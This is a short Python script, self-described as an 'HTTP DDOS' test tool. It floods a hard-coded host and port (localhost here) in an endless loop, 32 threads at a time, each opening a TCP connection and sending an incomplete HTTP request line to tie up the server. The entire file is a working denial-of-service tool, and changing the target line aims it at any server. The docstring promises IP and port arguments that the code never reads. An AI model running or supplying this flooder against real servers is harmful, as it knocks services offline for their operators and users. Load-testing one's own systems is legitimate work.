"""Test tool: HTTP DDOS
Arg 1: IP
Arg 2: Port
"""

import socket
import time
from contextlib import suppress
from threading import Thread

from loguru import logger

send_count = 0


def send_request(ip: str, port: int, wait_time: int = 0) -> None:
    """发送一次HTTP/1.1请求."""
    global send_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
    except ConnectionRefusedError:
        logger.error("Connection Failed.")
        return
    sock.setblocking(0)
    try:
        sock.send(b"GET / HTTP/1.1\r\n")
    except ConnectionAbortedError:
        logger.warning("Connection Aborted.")
        return
    logger.info(f"Sended Request {send_count} / inf")
    send_count += 1
    time.sleep(wait_time)


def packet(ip: str, port: int) -> None:
    """发送一次数据包并记录时间."""
    last_time = time.perf_counter()
    send_request(ip, port)
    last_packet_time = time.perf_counter()
    logger.info(f"Packet Time: {round(last_packet_time - last_time, 3)}")


if __name__ == "__main__":
    while True:
        threads = []
        for _ in range(32):
            threads.append(
                Thread(target=packet, args=("127.0.0.1", 3872)),
            )
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
